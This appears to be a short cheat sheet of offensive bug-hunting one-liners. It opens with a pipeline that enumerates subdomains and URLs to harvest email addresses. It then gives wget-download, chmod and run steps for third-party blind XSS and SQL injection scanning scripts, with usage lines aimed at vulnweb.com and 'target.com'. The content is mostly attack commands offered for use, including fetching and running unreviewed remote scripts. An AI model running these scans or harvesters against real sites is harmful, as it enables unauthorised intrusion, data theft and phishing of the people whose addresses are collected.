## Email/Gmail Extractor
```
subfinder -d "vulnweb.com" -all -recursive | httpx -mc 200 -duc -silent | sed -E 's,https?://(www\.)?,,' | wurls -s | iconv -f ISO-8859-1 -t UTF-8 -c | grep -Eoi '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' \
| tr '[:upper:]' '[:lower:]' \
| grep -vE '\.(png|jpg|jpeg|svg|gif)$' \
| grep -vE '^(donot.?reply|no-?reply|noreply|no_reply|webmaster|postmaster|admin|support|abuse|bounce|mailer-daemon|contact|help)@' \
| grep -vE '^[0-9]+@' \
| sort -u \
| tee vulnweb.com_email.txt
```
## bx
```
wget "https://raw.githubusercontent.com/h6nt3r/tools/refs/heads/main/oneliners/bx.sh"
sudo chmod +x ./bx.sh
./bx.sh -h
```

```
./bx.sh -l "target.com" -u "hnterx"
```
```
./bx.sh -d "target.com" -u "hnterx"
```

## Blind XSS install
```
wget "https://raw.githubusercontent.com/h6nt3r/tools/refs/heads/main/oneliners/bxsser.sh"
sudo chmod +x ./bxsser.sh
./bxsser.sh -h
```
## usage
```
./bxsser.sh -d "http://testphp.vulnweb.com"
```
```
./bxsser.sh -l "http://vulnweb.com"
```
### SQLI.sh install
```
wget "https://raw.githubusercontent.com/h6nt3r/tools/refs/heads/main/oneliners/sqlier.sh"
sudo chmod +x ./sqlier.sh
./sqlier.sh -h
```
```
./sqlier.sh -l "vulnweb.com" -tech "T"
```
```
./sqlier.sh -d "vulnweb.com" -tech "T"
```
